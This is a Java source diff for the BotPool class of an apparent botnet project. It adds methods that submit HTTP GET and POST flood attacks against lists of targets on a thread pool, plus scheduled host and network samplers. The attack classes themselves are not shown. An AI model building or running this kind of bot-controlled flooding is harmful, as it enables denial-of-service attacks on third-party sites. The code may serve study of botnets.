@@ -26,13 +26,21 @@
 
 package com.acmutv.botnet.bot;
 
+import com.acmutv.botnet.attack.HttpAttack;
+import com.acmutv.botnet.attack.HttpAttackMethod;
+import com.acmutv.botnet.attack.HttpGetAttack;
+import com.acmutv.botnet.attack.HttpPostAttack;
 import com.acmutv.botnet.bot.task.ExecutorServiceKill;
 import com.acmutv.botnet.bot.task.ExecutorServiceShutdown;
-import com.acmutv.botnet.tool.SystemTools;
+import com.acmutv.botnet.report.statistics.NetworkSampler;
+import com.acmutv.botnet.report.statistics.SystemSampler;
+import com.acmutv.botnet.service.HostSystemDetails;
+import com.acmutv.botnet.target.HttpTarget;
 import lombok.Data;
 
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
+import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
 
 /**
@@ -49,12 +57,36 @@ public class BotPool {
   public static final TimeUnit SHUTDOWN_TIMEOUT_UNIT = TimeUnit.SECONDS;
 
   private ExecutorService fixedThreadPool;
-  private ExecutorService scheduledThreadPool;
+  private ScheduledExecutorService scheduledThreadPool;
 
   public BotPool() {
-    int cores = SystemTools.getCores();
+    int cores = HostSystemDetails.getCores();
     this.fixedThreadPool = Executors.newFixedThreadPool(cores);
     this.scheduledThreadPool = Executors.newScheduledThreadPool(1);
+  }
+
+  public void registerSystemSampler(long frequency, TimeUnit unit) {
+    SystemSampler sampler = new SystemSampler();
+    this.getScheduledThreadPool().scheduleAtFixedRate(sampler, 0, frequency, unit);
+  }
+
+  public void registerNetworkSampler(long frequency, TimeUnit unit) {
+    NetworkSampler sampler = new NetworkSampler();
+    this.getScheduledThreadPool().scheduleAtFixedRate(sampler, 0, frequency, unit);
+  }
+
+  public void registerHttpGetAttack(HttpTarget...targets) {
+    for (HttpTarget target : targets) {
+      HttpAttack attacker = new HttpGetAttack(target);
+      this.getFixedThreadPool().submit(attacker);
+    }
+  }
+
+  public void registerHttpPostAttack(HttpTarget...targets) {
+    for (HttpTarget target : targets) {
+      HttpAttack attacker = new HttpPostAttack(target);
+      this.getFixedThreadPool().submit(attacker);
+    }
   }
 
   public void shutdown(long amount, TimeUnit unit) {
